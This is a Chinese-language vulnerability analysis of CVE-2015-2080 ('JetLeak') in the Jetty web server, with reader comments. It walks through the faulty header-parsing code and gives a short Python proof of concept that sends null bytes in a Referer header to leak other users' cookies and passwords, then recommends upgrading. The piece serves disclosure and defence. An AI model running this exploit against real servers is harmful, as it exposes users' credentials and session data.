<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">[CVE-2015-2080] Jetty web server 远程共享缓冲区泄漏</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">路人甲</a> <span class="bull">·</span> <time title="2015/02/26 12:59" ui-time="" datetime="2015/02/26 12:59" class="published ng-binding ng-isolate-scope">2015/02/26 12:59</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 简介</h1><hr><p>一家叫GDS的网站很丑的安全公司近日发现了一个 jetty web server的安全漏洞，允许攻击者远程读取其他用户之前的请求信息，下一句话的意思是好好学习我就不翻译了。</p><p>简单来说，如果你运行着存在漏洞的jetty版本，那么你的密码，请求头，cookie，anti-csrf令牌，token等等一系列的东西遭到黑客窃取。比如post请求中包含的信息。</p><p>GDS还发现一个重要的事情就是，此数据泄漏漏洞本身并不局限于request请求，还可以应用在response上，为了方便，这里只简单演示下攻击request。</p><p>漏洞的根本原因在于，当提交非法的headers给服务器时会触发异常处理代码，其返回一个约16字节的共享缓冲区数据。so，攻击者可以通过精心构造headers值来触发异常并偏移到共享缓冲区，其中包含了之前其他用户提交的请求，服务器会根据攻击者的payload返回特定位置的数据。</p><h1>0x01 相关信息</h1><hr><p>漏洞影响的版本至 9.2.3之后的大多数版本。</p><p>gds写了一个简单的python脚本用于测试是否存在该漏洞，读者可以从github上下载该脚本。</p><p>https://github.com/GDSSecurity/Jetleak-Testing-Script</p><h1>0x02 漏洞原因</h1><hr><p>这一小节我们会集中在服务器如何解析request。</p><p>当jetty接受到一个http请求，下面的代码会用于解析request中的header值，服务器会循环检查所有的字符，以下是检查事项。</p><p>1164行 服务器检查是否是无效的ascii字符</p><p>1172行 检查字符是否是为一个空格or tab。</p><p>1175行 是否是换行字符</p><p>1186行 如果字符中存在非法的ascii字符（比如小于0x20）那么代码就会抛出一个IllegalCharacter异常，并且传入异常字符串和共享缓冲区。</p><p>File: jetty-http\src\main\java\org\eclipse\jetty\http\HttpParser.java</p><pre><code>#!java
920: protected boolean parseHeaders(ByteBuffer buffer)
921: {
[..snip..]
1163:     case HEADER_VALUE:
1164:         if (ch&gt;HttpTokens.SPACE || ch&lt;0)
1165:         {
1166:             _string.append((char)(0xff&amp;ch));
1167:             _length=_string.length();
1168:             setState(State.HEADER_IN_VALUE);
1169:             break;
1170:         }
1171:
1172:         if (ch==HttpTokens.SPACE || ch==HttpTokens.TAB)
1173:            break;
1174:
1175:         if (ch==HttpTokens.LINE_FEED)
1176:         {
1177:             if (_length &gt; 0)
1178:             {
1179:                 _value=null;
1180:                 _valueString=(_valueString==null)?
                             takeString():(_valueString+” “+
                             takeString());
1181:             }
1182:             setState(State.HEADER);
1183:             break;
1184:         }
1185:
1186:         throw new IllegalCharacter(ch,buffer);
</code></pre><p>接着屌丝们跟踪代码到IllegalCharacter的实现，服务器用string.format方法返回一个非法字符的错误消息，问题出在最后代码通过调用BufferUtil.toDebugString来输出共享内存的内容。</p><p>File: jetty-http\src\main\java\org\eclipse\jetty\http\HttpParser.java</p><pre><code>#!java
1714: private class IllegalCharacter extends BadMessage
1715: {
1716:     IllegalCharacter(byte ch,ByteBuffer buffer)
1717:     {
1718:         super(String.format(“Illegal character 0x%x 
                      in state=%s in '%s’”,ch,_state,
                      BufferUtil.toDebugString(buffer)));
1719:     }
1720: }
</code></pre><p>接着到toDebugString方法，总的来说就是调研了appendDebugString将StringBuider作为第一个参数，缓冲区作为第二个参数，StringBuider的内容最终由appendDebugString进行填充并且返回给用户。</p><p>File: jetty-util\src\main\java\org\eclipse\jetty\util\BufferUtil.java</p><pre><code>#!java
 963: public static String toDebugString(ByteBuffer buffer)
 964: {
 965:     if (buffer == null)
 966:         return “null”;
 967:     StringBuilder buf = new StringBuilder();
 968:     appendDebugString(buf,buffer);
 969:     return buf.toString();
 970: }
</code></pre><p>额，我们前面说道，共享内存包含之前的request数据，为了让黑客能够获取指定的数据，那么我们就需要创建一个足够长的非法字符串去不断覆盖不重要的数据直到服务器返回我们想要的数据。我们可以看到，在代码996行，在进行append之前，攻击者已经通过非法header偏移到之前的请求，那么此时返回的16字节应该会包含我们想要的数据。</p><p>File: jetty-util\src\main\java\org\eclipse\jetty\util\BufferUtil.java</p><pre><code>#!java
972:  private static void appendDebugString(StringBuilder buf,ByteBuffer buffer)
973: {
[..snip..]
983:     buf.append(“&lt;&lt;&lt;”);
984:     for (int i = buffer.position(); i &lt; buffer.limit(); i++)
985:     {
986:         appendContentChar(buf,buffer.get(i));
987:         if (i == buffer.position() + 16 &amp;&amp; 
                     buffer.limit() &gt; buffer.position() + 32)
988:         {
989:             buf.append(“…”);
990:             i = buffer.limit() - 16;
991:         }
992:     }
993:     buf.append(“&gt;&gt;&gt;”);
994:     int limit = buffer.limit();
995:     buffer.limit(buffer.capacity());
996:     for (int i = limit; i &lt; buffer.capacity(); i++)
997:     {
998:         appendContentChar(buf,buffer.get(i));
999:         if (i == limit + 16 &amp;&amp; 
                    buffer.capacity() &gt; limit + 32)
1000:        {
1001:             buf.append(“…”);
1002:             i = buffer.capacity() - 16;
1003:         }
1004:     }
1005:     buffer.limit(limit);
1006: }
</code></pre><p>简单来说这次的漏洞主要问题出在对于非法字符的异常触发上，就是IllegalCharacter，笔者罗列了调用了IllegalCharacter的文件。</p><pre><code>\jetty.project-jetty-9.2.x\jetty-http\src\main\java\org\eclipse\jetty\http\HttpParser.java:401
\jetty.project-jetty-9.2.x\jetty-http\src\main\java\org\eclipse\jetty\http\HttpParser.java:530
\jetty.project-jetty-9.2.x\jetty-http\src\main\java\org\eclipse\jetty\http\HttpParser.java:547
\jetty.project-jetty-9.2.x\jetty-http\src\main\java\org\eclipse\jetty\http\HttpParser.java:1161
\jetty.project-jetty-9.2.x\jetty-http\src\main\java\org\eclipse\jetty\http\HttpParser.java:1215
</code></pre><p>下面一个小节进行了一次简单的攻击。</p><h1>0x03 漏洞利用</h1><hr><h2>Step 1:</h2><hr><p>jetty版本 version 9.2.7.v20150116</p><p>注意下面的请求，我们假设一个受害人发送了这玩意，请注意cookie和post，我们将通过攻击jetty获取下列的值。</p><p>Reproduction Request (VICTIM):</p><pre><code>POST /test-spec/test HTTP/1.1
Host: 192.168.56.101:8080
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64; rv:35.0) Gecko/20100101
Cookie: password=secret
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.101:8080/test-spec/
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

param1=test
</code></pre><p>Reproduction Response (VICTIM):</p><pre><code>HTTP/1.1 200 OK
Set-Cookie: visited=yes
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Type: text/html
Server: Jetty(9.2.7.v20150116)
Content-Length: 3460
</code></pre><h2>Step 2:</h2><hr><p>之后，攻击者用一个简单的python脚本，在header中插入44个空字节，这回导致异常的触发，需要注意的是，搞清楚多少个字节才能覆盖到敏感数据是一个反复的过程，建议先通过较小的字符串，不断加大，如果一开始选择较大的字符串可能会覆盖一些敏感数据。</p><pre><code>#!python
import httplib, urllib

conn = httplib.HTTPConnection("127.0.0.1:8080")

headers = {"Referer": chr(0)*44}
conn.request("POST", "/test-spec/test", "", headers)
r1 = conn.getresponse()
print r1.status, r1.reason
</code></pre><h2>Step 3:</h2><hr><p>一旦运行上面的python脚本，那么攻击者就会收到如图中所示的错误信息，请注意其中包含的cookie和密码，如果你想要大于16个字节的数据，那么修改下长度多跑几次就好了。</p><p><img alt="enter image description here" img-src="9de787191b4c27347b8707256c7e65e3ce4f3689.jpg"></p><p><img alt="enter image description here" img-src="d18983673336482bc16e43530083376126952258.jpg"></p><h1>0x04 结语和修复建议</h1><hr><p>如果你不幸运行着存在漏洞版本的jetty，那么官方的建议是立即更新到version 9.2.9.v20150224。 这里有一份jetty的客户名单，我就不说我看到阿里了。</p><p>http://eclipse.org/jetty/powered/</p><p>如果需要进行版本更新可以通过以下地址</p><p>Maven - http://central.maven.org/</p><p>Jetty Downloads Page - http://download.eclipse.org/jetty</p><p>这里是原文：http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html</p><p>我省略了修复建议中的一些细节还有漏洞披露的时间表，具体可以参考原文。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/5107" rel="bookmark" id="re1">ElasticSearch Groovy脚本远程代码执行漏洞分析（CVE-2015-1427）</a></li><li><a href="http://drops.wooyun.org/papers/13243" rel="bookmark" id="re2">Xstream Deserializable Vulnerablity And Groovy（CVE-2015-3253）</a></li><li><a href="http://drops.wooyun.org/papers/7073" rel="bookmark" id="re3">OpenSSL-CVE-2015-1793漏洞分析</a></li><li><a href="http://drops.wooyun.org/papers/13433" rel="bookmark" id="re4">CVE-2016-0799简单分析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2015-02-26 14:56:15</span></div><p></p><p>跟heartbleed还是有点不一样吧？</p><p>需要注意的是，搞清楚多少个字节才能覆盖到敏感数据是一个反复的过程，建议先通过较小的字符串，不断加大，如果一开始选择较大的字符串可能会覆盖一些敏感数据。</p><p>注意“覆盖”</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">存在敏感词</span> <span class="reply-time">2015-02-26 13:35:49</span></div><p></p><p>Jetty Heartbleed...漏洞有点严重啊</p><p></p></div></div></div></div></div></main>